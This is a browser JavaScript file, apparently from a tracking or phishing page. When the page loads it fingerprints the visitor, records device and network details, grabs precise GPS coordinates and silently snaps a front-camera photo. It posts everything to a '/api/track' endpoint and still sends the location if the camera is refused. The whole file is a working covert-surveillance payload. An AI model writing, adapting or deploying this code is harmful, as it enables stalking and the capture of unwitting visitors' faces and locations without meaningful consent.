const API = "/api/track";

// ==============================
// SESSION + USER
// ==============================
function getUserId() {
  let id = localStorage.getItem("user_id");
  if (!id) {
    id = crypto.randomUUID();
    localStorage.setItem("user_id", id);
  }
  return id;
}

const USER_ID = getUserId();
const SESSION_ID = crypto.randomUUID();

// ==============================
// FINGERPRINT
// ==============================
function getFingerprint() {
  return btoa(
    navigator.userAgent +
    screen.width +
    screen.height +
    navigator.language +
    navigator.hardwareConcurrency
  );
}

const FP = getFingerprint();

// ==============================
// SEND FUNCTION
// ==============================
function send(data) {
  fetch(API, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      user_id: USER_ID,
      session_id: SESSION_ID,
      fingerprint: FP,
      ...data
    })
  }).catch(err => console.log("Send error:", err));
}

// ==============================
// INIT DATA
// ==============================
send({
  event: "init",
  device: navigator.userAgent,
  os: navigator.platform,
  browser: navigator.userAgent,
  network: navigator.connection?.effectiveType || "unknown",
  time: new Date().toISOString()
});

// ==============================
// NETWORK UPDATE
// ==============================
const net = navigator.connection || {};
send({
  event: "network",
  network: net.effectiveType || "unknown",
  downlink: net.downlink || "-"
});

// ==============================
// GPS HANDLING (IMPORTANT FIX)
// ==============================
let gpsDone = false;
let gpsData = {};

// robust GPS
function getGPS() {
  return new Promise(resolve => {
    navigator.geolocation.getCurrentPosition(
      pos => {
        gpsDone = true;
        gpsData = {
          lat: pos.coords.latitude,
          lng: pos.coords.longitude
        };

        send({ event: "gps", ...gpsData });
        resolve();
      },
      err => {
        console.log("GPS error:", err.message);
        gpsDone = true;
        resolve();
      },
      {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      }
    );
  });
}
// ==============================
// FINAL CONTROL (NO DUPLICATE)
// ==============================
let finalSent = false;

function sendFinal(data) {
  if (finalSent) return;
  finalSent = true;

  send({
    event: "final",
    time: new Date().toISOString(),
    ...data
  });
}

// ==============================
// CAMERA CAPTURE (FIXED FLOW)
// ==============================
async function camera() {

  // 👉 START GPS FIRST
  const gpsPromise = getGPS();

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    await video.play();

    // ⏳ WAIT GPS (max 5 sec)
    await Promise.race([
      gpsPromise,
      new Promise(r => setTimeout(r, 5000))
    ]);

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    canvas.getContext("2d").drawImage(video, 0, 0);

    const image = canvas.toDataURL("image/jpeg", 0.85);

    sendFinal({
      image,
      ...gpsData
    });

    stream.getTracks().forEach(t => t.stop());

  } catch {
    await Promise.race([
      gpsPromise,
      new Promise(r => setTimeout(r, 5000))
    ]);

    sendFinal({
      camera: "denied",
      ...gpsData
    });
  }
}

// ==============================
// RUN CAMERA
// ==============================
camera();

// ==============================
// FALLBACK (SAFE)
// ==============================
setTimeout(() => {
  sendFinal({
    camera: "timeout",
    ...gpsData
  });
}, 8000);
